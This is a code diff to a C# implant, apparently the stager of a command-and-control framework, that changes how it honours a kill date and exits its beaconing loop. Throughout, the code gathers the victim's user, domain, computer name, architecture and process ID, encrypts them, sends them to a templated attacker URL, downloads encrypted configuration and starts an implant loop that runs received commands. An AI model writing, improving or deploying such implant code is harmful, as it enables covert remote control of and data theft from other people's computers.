@@ -187,48 +187,50 @@ public class Program
     DateTime now = DateTime.Now;
     DateTime killDate = Convert.ToDateTime("#REPLACEKILLDATE#");
     if (killDate < now){
-      Console.ReadLine();
+      //Console.ReadLine();
+    } else {
+      var u = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+  		var dn = System.Environment.UserDomainName;
+  		var cn = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
+  		var arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
+  		int pid = Process.GetCurrentProcess().Id;
+  		Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
+  		string o = $"{dn};{u};{cn};{arch};{pid};#REPLACEBASEURL#";
+  		string key = "#REPLACEKEY#";
+  		var pp = Encryption(key, o);
+  		string baseURL = "#REPLACEBASEURL#";
+  		string s = "#REPLACESTARTURL#";
+  		var primer = GetWebRequest(pp).DownloadString(s);
+  		var x = Decryption(key, primer);
+  
+  		Regex re = new Regex("RANDOMURI19901(.*)10991IRUMODNAR");
+  		Match m = re.Match(x);
+  		string RandomURI = m.Groups[1].ToString();
+  
+  		re = new Regex("URLS10484390243(.*)34209348401SLRU");
+  		m = re.Match(x);
+  		string URLS = m.Groups[1].ToString();
+  
+  		re = new Regex("KILLDATE1665(.*)5661ETADLLIK");
+  		m = re.Match(x);
+  		var KillDate = m.Groups[1].ToString();
+  
+  		re = new Regex("SLEEP98001(.*)10089PEELS");
+  		m = re.Match(x);
+  		var Sleep = m.Groups[1].ToString();
+  
+  		re = new Regex("NEWKEY8839394(.*)4939388YEKWEN");
+  		m = re.Match(x);
+  		var NewKey = m.Groups[1].ToString();
+  
+  		re = new Regex("IMGS19459394(.*)49395491SGMI");
+  		m = re.Match(x);
+  		var IMGs = m.Groups[1].ToString();
+  
+  		ImplantCore(baseURL, RandomURI, URLS, KillDate, Sleep, NewKey, IMGs);
     }
         
-		var u = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
-		var dn = System.Environment.UserDomainName;
-		var cn = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
-		var arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
-		int pid = Process.GetCurrentProcess().Id;
-		Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
-		string o = $"{dn};{u};{cn};{arch};{pid};#REPLACEBASEURL#";
-		string key = "#REPLACEKEY#";
-		var pp = Encryption(key, o);
-		string baseURL = "#REPLACEBASEURL#";
-		string s = "#REPLACESTARTURL#";
-		var primer = GetWebRequest(pp).DownloadString(s);
-		var x = Decryption(key, primer);
-
-		Regex re = new Regex("RANDOMURI19901(.*)10991IRUMODNAR");
-		Match m = re.Match(x);
-		string RandomURI = m.Groups[1].ToString();
-
-		re = new Regex("URLS10484390243(.*)34209348401SLRU");
-		m = re.Match(x);
-		string URLS = m.Groups[1].ToString();
-
-		re = new Regex("KILLDATE1665(.*)5661ETADLLIK");
-		m = re.Match(x);
-		var KillDate = m.Groups[1].ToString();
-
-		re = new Regex("SLEEP98001(.*)10089PEELS");
-		m = re.Match(x);
-		var Sleep = m.Groups[1].ToString();
-
-		re = new Regex("NEWKEY8839394(.*)4939388YEKWEN");
-		m = re.Match(x);
-		var NewKey = m.Groups[1].ToString();
-
-		re = new Regex("IMGS19459394(.*)49395491SGMI");
-		m = re.Match(x);
-		var IMGs = m.Groups[1].ToString();
-
-		ImplantCore(baseURL, RandomURI, URLS, KillDate, Sleep, NewKey, IMGs);
+		
   }
   
   static byte[] Compress(byte[] raw)
@@ -305,7 +307,8 @@ public class Program
     }
     var strOutput = new StringWriter();
     Console.SetOut(strOutput);
-  	while(true)
+    bool bExit = true;
+  	while(bExit)
   	{
     	Random rnd = new Random();
   		string URL = stringnewURLS[rnd.Next(stringnewURLS.Length)];
@@ -316,7 +319,7 @@ public class Program
       DateTime now = DateTime.Now;
       DateTime killDate = Convert.ToDateTime(KillDate);
       if (killDate < now){
-        Console.ReadLine();
+        bExit = false;
       }
       string output = "";
       try {
@@ -443,7 +446,7 @@ public class Program
             }
             
             if (c.ToLower().StartsWith("exit")){
-              Console.ReadLine();
+              bExit = false;
             }
             
             if (c.ToLower().StartsWith("start-process")){
